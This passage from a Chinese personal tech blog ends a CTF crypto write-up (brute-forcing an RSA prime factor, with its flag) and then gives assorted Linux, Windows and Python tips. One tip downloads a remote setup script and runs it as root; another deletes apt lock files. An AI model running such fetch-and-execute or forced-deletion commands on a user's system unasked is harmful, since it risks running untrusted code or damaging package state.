class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">start = time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(tot):</span><br><span class="line">	<span class="keyword">if</span> n % (p0 + i) == <span class="number">0</span>:</span><br><span class="line">		print(p0 + i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> n % (p0 - i) == <span class="number">0</span>:</span><br><span class="line">		print(p0 - i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">end = time()</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;用时：<span class="subst">&#123;end - start&#125;</span> s&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>我计了一个时，442秒，就成功爆破出了n的一个质因数，后面就简单了，直接yafu分解剩下的部分，然后就可以得到flag。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4e9f2a7f-bda9-4a46-af51-b29e0c61973e&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/73741824.png" alt="73741824"></p>
<p><del><strong>我算了算，2<sup>30</sup> - 10<sup>9</sup> = 73741824</strong>，原来我离AK，甚至一血只差了73741824。</del></p>
<p><strong>谨以此，已备忘。</strong></p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul>
<li><a target="_blank" rel="noopener" href="https://nonuplebroken.com/2020/06/10/%E5%8F%8D%E9%A6%88%E7%A7%BB%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8/#%E5%8F%8D%E9%A6%88%E7%A7%BB%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8">https://nonuplebroken.com/2020/06/10/%E5%8F%8D%E9%A6%88%E7%A7%BB%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8/#%E5%8F%8D%E9%A6%88%E7%A7%BB%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/08/30/2020%E5%9B%BD%E8%B5%9B%E8%A7%85%E9%A9%AC/" data-id="ckja3vkqj001u14lnb7tog2h8" data-title="2020国赛觅马wp" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-杂项" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/08/11/%E6%9D%82%E9%A1%B9/" class="article-date">
  <time class="dt-published" datetime="2020-08-11T07:54:33.000Z" itemprop="datePublished">2020-08-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/08/11/%E6%9D%82%E9%A1%B9/">杂项</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="chrome-新edge-强制暗黑模式"><a href="#chrome-新edge-强制暗黑模式" class="headerlink" title="chrome/新edge 强制暗黑模式"></a>chrome/新edge 强制暗黑模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Chrome：chrome:&#x2F;&#x2F;flags&#x2F;#enable-force-dark</span><br><span class="line">Edge：edge:&#x2F;&#x2F;flags&#x2F;#enable-force-dark</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://www.appinn.com/enable-force-dark-for-chrome-and-edge/">https://www.appinn.com/enable-force-dark-for-chrome-and-edge/</a></p>
<h3 id="Ubuntu-升级-node-amp-npm"><a href="#Ubuntu-升级-node-amp-npm" class="headerlink" title="Ubuntu 升级 node&amp;npm"></a>Ubuntu 升级 node&amp;npm</h3><p><code>Ubuntu18.04</code> 默认安装了 <code>Nodejs v8.x</code> 版本</p>
<p>升级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL https:&#x2F;&#x2F;deb.nodesource.com&#x2F;setup_10.x -o nodesource_setup.sh</span><br><span class="line">$ sudo bash nodesource_setup.sh</span><br><span class="line">$ sudo apt install nodejs</span><br><span class="line"></span><br><span class="line"># 需要从源代码编译代码的 NPM 包</span><br><span class="line">$ sudo apt install build-essential</span><br></pre></td></tr></table></figure>
<p>检查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://learnku.com/articles/29950">https://learnku.com/articles/29950</a></p>
<h3 id="python-print-different"><a href="#python-print-different" class="headerlink" title="python print different"></a>python print different</h3><p>有时候需要将python的输出换成不同的颜色，以突出显示想要表示的重点，于是可以用这个方法。</p>
<p>显示颜色的格式：</p>
<blockquote>
<p>\ 033 [显示方式;字体色;背景色m something [\ 033 [0m]</p>
</blockquote>
<p>具体各个参数如下表：</p>
<table>
<thead>
<tr>
<th>显示方式</th>
<th>效果</th>
<th>字体色</th>
<th>背景色</th>
<th>颜色描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>终端默认设置</td>
<td>30</td>
<td>40</td>
<td>黑色</td>
</tr>
<tr>
<td>1</td>
<td>高亮显示</td>
<td>31</td>
<td>41</td>
<td>红色</td>
</tr>
<tr>
<td>4</td>
<td>使用下划线</td>
<td>32</td>
<td>42</td>
<td>绿色</td>
</tr>
<tr>
<td>5</td>
<td>闪烁</td>
<td>33</td>
<td>43</td>
<td>黄色</td>
</tr>
<tr>
<td>7</td>
<td>反白显示</td>
<td>34</td>
<td>44</td>
<td>蓝色</td>
</tr>
<tr>
<td>8</td>
<td>不可见</td>
<td>35</td>
<td>45</td>
<td>紫红色</td>
</tr>
<tr>
<td></td>
<td></td>
<td>36</td>
<td>46</td>
<td>青蓝色</td>
</tr>
<tr>
<td></td>
<td></td>
<td>37</td>
<td>47</td>
<td>白色</td>
</tr>
</tbody></table>
<p>例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;This is a \033[1;35m test \033[0m!&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;This is a \033[1;32;43m test \033[0m!&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\033[1;33;44mThis is a test !\033[0m&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>效果</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201226165048710.png" alt="python-print"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34857250/article/details/79673698">https://blog.csdn.net/qq_34857250/article/details/79673698</a></p>
<h3 id="利用win10画图实现图片反色"><a href="#利用win10画图实现图片反色" class="headerlink" title="利用win10画图实现图片反色"></a>利用win10画图实现图片反色</h3><p>将想要反色的图片使用win10自带的画图打开，然后用下面的快捷键 <code>ctrl+shift+i</code> 可以实现反色。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctrl+shift+i</span><br></pre></td></tr></table></figure>


<h3 id="虚拟机网络故障的修复"><a href="#虚拟机网络故障的修复" class="headerlink" title="虚拟机网络故障的修复"></a>虚拟机网络故障的修复</h3><blockquote>
<p>描述：物理机网络正常，也是管理员模式运行的，VM显示网卡连接正常，但是没有网。并且体现在，ping 任何东西都找不到域名，右上角也没有了之前那个网络连接的图标了。</p>
</blockquote>
<p>输入<code>ip a</code> ,显示为：</p>
<blockquote>
<p>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br> link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br> inet 127.0.0.1/8 scope host lo<br>    valid_lft forever preferred_lft forever<br> inet6 ::1/128 scope host<br>    valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000<br> link/ether 00:00:00:00:00:d5 brd ff:ff:ff:ff:ff:ff<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default<br> link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff<br> inet 192.97.0.1/16 brd 192.97.255.255 scope global docker0<br>    valid_lft forever preferred_lft forever</p>
</blockquote>
<p>正常情况下，<code>ens33</code> 后面应该还有些内容的。</p>
<p>网上找到一个方法，亲测有用，并且之后再出现没网的时候，也屡试不爽。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service NetworkManager stop</span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state</span><br><span class="line">sudo service NetworkManager start</span><br></pre></td></tr></table></figure>
<p>建议写成一个可执行脚本，下次直接运行即可。</p>
<p>然后再 <code>ip a</code> 的结果如下，</p>
<blockquote>
<p>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br> link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br> inet 127.0.0.1/8 scope host lo<br>    valid_lft forever preferred_lft forever<br> inet6 ::1/128 scope host<br>    valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br> link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff<br> inet 192.168.247.133/24 brd 192.168.247.255 scope global dynamic noprefixroute ens33<br>    valid_lft 1530sec preferred_lft 1530sec<br> inet6 00:00:0000:0000:0000:0074/64 scope link noprefixroute<br>    valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default<br> link/ether 00:40:00:00:00:d8 brd ff:ff:ff:ff:ff:ff<br> inet 170.17.0.1/16 brd 170.17.255.255 scope global docker0<br>    valid_lft forever preferred_lft forever</p>
</blockquote>
<p>然后就修复了，右上角也有了有网络的图标了。</p>
<h3 id="ubuntu添加定时任务"><a href="#ubuntu添加定时任务" class="headerlink" title="ubuntu添加定时任务"></a>ubuntu添加定时任务</h3><p>有时候需要服务器定时执行一个脚本。如一个自动的健康打卡，就需要每天早上自动打卡帮助。</p>
<p>首先，打开终端输入下面命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
<p>然后按照里面的注释提示，前面是时间，中间是用户，后面的命令添加好。</p>
<p>然后重启服务即可。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service cron restart</span><br></pre></td></tr></table></figure>


<h3 id="screen-的使用"><a href="#screen-的使用" class="headerlink" title="screen 的使用"></a>screen 的使用</h3><p>由于某系必要的原因，在断开 <code>ssh</code> 连接后，通过此 <code>ssh</code> 运行的所有进程和程序都会被强制干掉。（没有官方证据或者可能我的说法有问题）。但有时候需要在断开 <code>ssh</code> 后服务器继续执行之前的命令。</p>
<p>比如你自动的健康打卡是使用 <code>python</code> 加一个 <code>while</code> 死循环，用 <code>python</code> 来监控时间，每天定时打卡。但是你用 <code>ssh</code> 挂载到了服务器之后，一断开这个 <code>python</code> 的脚本就会被干掉。这是就需要这个功能了。而 <code>screen</code> 刚好可以做到。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个名字为 name 的screen</span></span><br><span class="line">screen -S name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列举出所有的screen</span></span><br><span class="line">screen -ls</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 退出当前会话（但是不停止执行）</span></span><br><span class="line">Ctrl + a + d</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 退出关闭screen会话</span></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 杀死某个进程的会话</span></span><br><span class="line">screen -X -S PID quit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新进入会话</span></span><br><span class="line">screen -r name/PID</span><br></pre></td></tr></table></figure>
<p>参考： <a target="_blank" rel="noopener" href="https://www.138vps.com/vpsjc/933.html">https://www.138vps.com/vpsjc/933.html</a></p>
<h3 id="kali换源"><a href="#kali换源" class="headerlink" title="kali换源"></a>kali换源</h3><p>启动终端输入下面命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p>将下面的地址填进去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br></pre></td></tr></table></figure>


<h3 id="cmd-挂代理"><a href="#cmd-挂代理" class="headerlink" title="cmd 挂代理"></a>cmd 挂代理</h3><p><strong>只代理了 <code>HTTP</code> <code>socks5</code> 同理。</strong></p>
<p>有些时候代理工具的全局模式也无法让CMD的走上代理。</p>
<p>打开一个需要设置代理的CMD，输入下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">set HTTP_PROXY=http://127.0.0.1:10809</span><br><span class="line">set HTTPs_PROXY=http://127.0.0.1:10809</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ubuntu</span></span><br><span class="line">export http_proxy=http://192.168.0.102:10809/</span><br><span class="line">export https_proxy=http://192.168.0.102:10809/</span><br></pre></td></tr></table></figure>
<p>同时，直接在git bash中设置是不行的，在CMD中设置了用git命令就会方便（快）很多。</p>
<p>检测自己设置成功与否，可以在当前CMD中输入下面的命令。利用 <code>curl</code> 来检测。</p>
<p><strong><code>ping</code> 来检测是不行的，这个只代理了 <code>http</code> 而 <code>ping</code> 使用的是 <code>ICMP</code> 的协议，因此不成。</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv https://google.com</span><br></pre></td></tr></table></figure>


<h3 id="Ubuntu-18-04-apt-install-error"><a href="#Ubuntu-18-04-apt-install-error" class="headerlink" title="Ubuntu 18.04 apt install error"></a>Ubuntu 18.04 apt install error</h3><p>运行 <code>sudo apt install ***</code> 报错，无法按照软件。报错信息如下：</p>
<blockquote>
<p>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p>
</blockquote>
<p>执行下面的命令，进行强制解锁，即可。（我也不知道哪条是真正起作用的，反正又不是不能用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/lock-frontend</span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br><span class="line">sudo rm /var/cache/apt/archives/lock</span><br></pre></td></tr></table></figure>


<h3 id="python-的全局解释锁-GIL"><a href="#python-的全局解释锁-GIL" class="headerlink" title="python 的全局解释锁 GIL"></a>python 的全局解释锁 GIL</h3><blockquote>
<p>尽管Python完全支持多线程编程， 但是解释器的C语言实现部分在完全并行执行时并不是线程安全的。 实际上，解释器被一个全局解释器锁保护着，它确保任何时候都只有一个Python线程执行。 GIL最大的问题就是Python的多线程程序并不能利用多核CPU的优势 （比如一个使用了多个线程的计算密集型程序只会在一个单CPU上面运行）。</p>
</blockquote>
<p>也就是 python 的多线程，底层还是单线程在跑。效率上不会有真正并行那么高，但是还是有很大用的。另外，需要性能提升的可以试着使用多进程来实现。</p>
<p>参考： <a target="_blank" rel="noopener" href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c12/p09_dealing_with_gil_stop_worring_about_it.html#python">https://python3-cookbook.readthedocs.io/zh_CN/latest/c12/p09_dealing_with_gil_stop_worring_about_it.html#python</a></p>
<h3 id="linux-统计文件夹下面文件数目"><a href="#linux-统计文件夹下面文件数目" class="headerlink" title="linux 统计文件夹下面文件数目"></a>linux 统计文件夹下面文件数目</h3><p>Linux下有三个命令：<code>ls</code>、<code>grep</code>、<code>wc</code>。通过这三个命令的组合可以统计目录下文件及文件夹的个数。</p>
<ul>
<li><p>统计当前目录下文件的个数（不包括目录）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l | grep &quot;^-&quot; | wc -l</span><br></pre></td></tr></table></figure></li>
<li><p>统计当前目录下文件的个数（包括子目录）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lR| grep &quot;^-&quot; | wc -l</span><br></pre></td></tr></table></figure></li>
<li><p>查看某目录下文件夹(目录)的个数（包括子目录）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lR | grep &quot;^d&quot; | wc -l</span><br></pre></td></tr></table></figure>
<p>命令解析</p>
</li>
<li><p><code>ls -l</code></p>
<p>长列表输出该目录下文件信息(注意这里的文件是指目录、链接、设备文件等)，每一行对应一个文件或目录，<code>ls -lR</code>是列出所有文件，包括子目录。</p>
</li>
<li><p><code>grep &quot;^-&quot;</code><br>过滤<code>ls</code>的输出信息，只保留一般文件，只保留目录是<code>grep &quot;^d&quot;</code>。</p>
</li>
<li><p><code>wc -l</code><br>统计输出信息的行数，统计结果就是输出信息的行数，一行信息对应一个文件，所以就是文件的个数。</p>
</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="http://noahsnail.com/2017/02/07/2017-02-07-Linux%E7%BB%9F%E8%AE%A1%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%95%B0%E7%9B%AE/">http://noahsnail.com/2017/02/07/2017-02-07-Linux%E7%BB%9F%E8%AE%A1%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%95%B0%E7%9B%AE/</a></p>
<h3 id="python-从-setup-py-安装包"><a href="#python-从-setup-py-安装包" class="headerlink" title="python 从 setup.py 安装包"></a>python 从 setup.py 安装包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python setup.py build</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<p>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/xxzhangx/article/details/53558654">https://blog.csdn.net/xxzhangx/article/details/53558654</a></p>
<h3 id="windows预览体验计划打开空白"><a href="#windows预览体验计划打开空白" class="headerlink" title="windows预览体验计划打开空白"></a>windows预览体验计划打开空白</h3><p>将 <code>诊断数据</code> 改成 <code>可选诊断数据</code> 就打开了</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228193756513.png" alt="诊断数据"></p>
<p>参考：<a target="_blank" rel="noopener" href="https://answers.microsoft.com/zh-hans/insider/forum/insider_wintp-insider_install/windows%E9%A2%84%E8%A7%88%E4%BD%93%E9%AA%8C/14d3002b-03ac-459e-b518-34231b1727e0?auth=1">https://answers.microsoft.com/zh-hans/insider/forum/insider_wintp-insider_install/windows%E9%A2%84%E8%A7%88%E4%BD%93%E9%AA%8C/14d3002b-03ac-459e-b518-34231b1727e0?auth=1</a></p>
<h3 id="anaconda-创建虚拟环境"><a href="#anaconda-创建虚拟环境" class="headerlink" title="anaconda 创建虚拟环境"></a>anaconda 创建虚拟环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建环境 创建一个名字为 pytorch_gpu 的环境，python的版本为3.7</span></span><br><span class="line">conda create -n pytorch_gpu pip python=3.7</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化环境</span></span><br><span class="line">conda init pytorch_gpu</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入该环境</span></span><br><span class="line">conda activate pytorch_gpu</span><br></pre></td></tr></table></figure>


<h3 id="自动生成-python-项目的依赖包"><a href="#自动生成-python-项目的依赖包" class="headerlink" title="自动生成 python 项目的依赖包"></a>自动生成 python 项目的依赖包</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先安装依赖</span></span><br><span class="line">pip install pipreqs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后 到项目根目录打开终端</span></span><br><span class="line">pipreqs ./ -<span class="literal">-encoding</span>=utf<span class="literal">-8</span></span><br></pre></td></tr></table></figure>


<h3 id="修改cmd的默认编码"><a href="#修改cmd的默认编码" class="headerlink" title="修改cmd的默认编码"></a>修改cmd的默认编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前活动的编码编号为多少</span><br><span class="line">CHCP</span><br><span class="line"></span><br><span class="line"># 切换为utf-8</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">#以下是几种常用的编码:</span><br><span class="line">#936 GBK(一般情况下为默认编码)</span><br><span class="line">#437 美国英语</span><br><span class="line">#65001 utf-8</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/iway_lch/article/details/50408796">https://blog.csdn.net/iway_lch/article/details/50408796</a></p>
<h3 id="ubuntu-安装-dlib"><a href="#ubuntu-安装-dlib" class="headerlink" title="ubuntu 安装 dlib"></a>ubuntu 安装 dlib</h3><p>参考： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/44469d7d86b3">https://www.jianshu.com/p/44469d7d86b3</a></p>
<h3 id="GraphicsMagick-1-3-35"><a href="#GraphicsMagick-1-3-35" class="headerlink" title="GraphicsMagick-1.3.35"></a>GraphicsMagick-1.3.35</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ycpanda/article/details/12199895">https://blog.csdn.net/ycpanda/article/details/12199895</a></p>
<h3 id="flask-的文件类"><a href="#flask-的文件类" class="headerlink" title="flask 的文件类"></a>flask 的文件类</h3><p><a target="_blank" rel="noopener" href="https://werkzeug.palletsprojects.com/en/1.0.x/datastructures/#werkzeug.datastructures.FileStorage">https://werkzeug.palletsprojects.com/en/1.0.x/datastructures/#werkzeug.datastructures.FileStorage</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/08/11/%E6%9D%82%E9%A1%B9/" data-id="ckja3vkq5000s14lngvzeba21" data-title="杂项" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Q-A/" rel="tag">Q&A</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tips/" rel="tag">tips</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%83%E4%B9%A0/">练习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CUDA/" rel="tag">CUDA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MiKTeX/" rel="tag">MiKTeX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Q-A/" rel="tag">Q&A</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WSL/" rel="tag">WSL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WSL2/" rel="tag">WSL2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS%E6%94%BB%E5%87%BB/" rel="tag">XSS攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/face-recognition/" rel="tag">face recognition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/latex/" rel="tag">latex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opencv/" rel="tag">opencv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pycuda/" rel="tag">pycuda</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/" rel="tag">tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zeit/" rel="tag">zeit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" rel="tag">人工智能</a></li><li 